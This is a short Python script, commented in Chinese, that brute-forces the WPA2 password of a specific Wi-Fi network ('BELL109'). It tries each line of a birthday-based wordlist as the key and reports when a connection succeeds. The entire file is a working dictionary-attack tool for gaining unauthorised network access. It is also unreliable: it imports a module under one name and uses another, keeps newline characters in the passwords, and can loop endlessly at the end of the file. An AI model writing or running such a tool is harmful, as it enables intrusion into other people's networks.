import pywifi_mac
from pywifi import const
import time

#导入模块
#抓取网卡接口
#断开所有wifi
#读取密码本
#测试连接
#设置睡眠时间


#测试连接 返回连接结果
def wificonnect(pwd):
    #抓取网卡借口
    wifi = pywifi.PyWiFi()
    #获取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    #断开所有连接
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == 0:
        #print("未连接")
        #创建wifi连接文件
        profile = pywifi.Profile()
        #要连接的wifi名称
        profile.ssid = "BELL109"
        #网卡的开放
        profile.auth = const.AUTH_ALG_OPEN
        #wifi的加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        #加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        #密码
        profile.key = pwd
        #删除所有wifi文件
        ifaces.remove_all_network_profiles()
        #设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        #用新的连接文件去测试连接
        ifaces.connect(tep_profile)
        #wifi连接的时间
        time.sleep(4)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False

    else:
        print("已连接")





def readPassword():
    print("开始破解")
    #读取密码本路径
    path = "/Users/xavier/PycharmProjects/untitled3/birthday.txt"
    #打开文件
    file = open(path ,'r')
    while True:
        # 读取文件错误
        try:
            # readline 读取一行
            passStr = file.readline()
            bool = wificonnect(passStr)
            if bool:
                print("密码正确", passStr)
                break
            else:
                print("密码不正确",passStr)
        except:
            continue


readPassword()

